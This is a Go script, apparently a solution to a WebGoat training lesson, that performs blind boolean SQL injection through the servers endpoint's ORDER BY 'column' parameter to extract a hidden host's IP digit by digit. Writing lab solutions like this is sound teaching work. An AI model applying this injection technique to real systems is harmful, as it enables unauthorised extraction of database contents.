//Get first 3 digits of IP to solve the challenge

package main

import (
        "encoding/json"
        "fmt"
        "io/ioutil"
        "log"
        "net/http"
        "os"
        "strconv"
)

type Exploiter interface {
        Exploit()
}

type OrderBy struct {
        ip            string
        port          string
        sessionCookie string
}

func banner(str string) string {
        return str
}

func (o OrderBy) Exploit() {
        url := "http://" + o.ip + ":" + o.port + "/WebGoat/SqlInjectionMitigations/servers?column="
        client := &http.Client{}

        for i := 0; i < 9; i++ {
                for j := 0; j < 4; j++ {
                        payload := "(case+when+exists(select+ip+from+servers+where+hostname+=+'webgoat-prd'+and+substring(ip," + strconv.Itoa(j) + ",1)='" + strconv.Itoa(i) + "')+then+ip+else+id+end)"

                        req, err := http.NewRequest(http.MethodGet, url+payload, nil)
                        if err != nil {
                                log.Fatal(err)
                        }

                        // Add JSESSIONID cookie
                        cookie := &http.Cookie{
                                Name:  "JSESSIONID",
                                Value: o.sessionCookie,
                        }
                        req.AddCookie(cookie)

                        resp, err := client.Do(req)
                        if err != nil {
                                log.Fatal(err)
                        }
                        defer resp.Body.Close()

                        body, err := ioutil.ReadAll(resp.Body)
                        if err != nil {
                                log.Fatal(err)
                        }

                        var servers []struct {
                                ID string `json:"id"`
                        }

                        err = json.Unmarshal(body, &servers)
                        if err != nil {
                                log.Fatal(err)
                        }

                        if len(servers) > 0 {
                                firstID := servers[0].ID
                                if firstID == "2" {
                                        fmt.Println("Found=> ", payload)
                                        fmt.Println("IP: " + strconv.Itoa(i))
                                        break
                                }
                        } else {
                                fmt.Println("No servers found in the response")
                        }
                }
        }
}

func callMethod(m Exploiter) {
        m.Exploit()
}

func main() {
        if len(os.Args) < 4 {
                fmt.Println("Usage: ./orderBy <ip> <port> <sessionCookie>")
                os.Exit(1)
        }

        fmt.Println(banner(`
         _____ _ _       _    _____ _____ __    _    _____         _     _ _   
        | __  | |_|___ _| |  |   __|     |  |  |_|  |   __|_ _ ___| |___|_| |_ 
        | __ -| | |   | . |  |__   |  |  |  |__| |  |   __|_'_| . | | . | |  _|
        |_____|_|_|_|_|___|  |_____|__  _|_____|_|  |_____|_,_|  _|_|___|_|_|  
                                      |__|                    |_|              
                       |   Made with <3 by @Offensive Droid |
        `))

        o := OrderBy{
                ip:            os.Args[1],
                port:          os.Args[2],
                sessionCookie: os.Args[3],
        }

        callMethod(o)
}
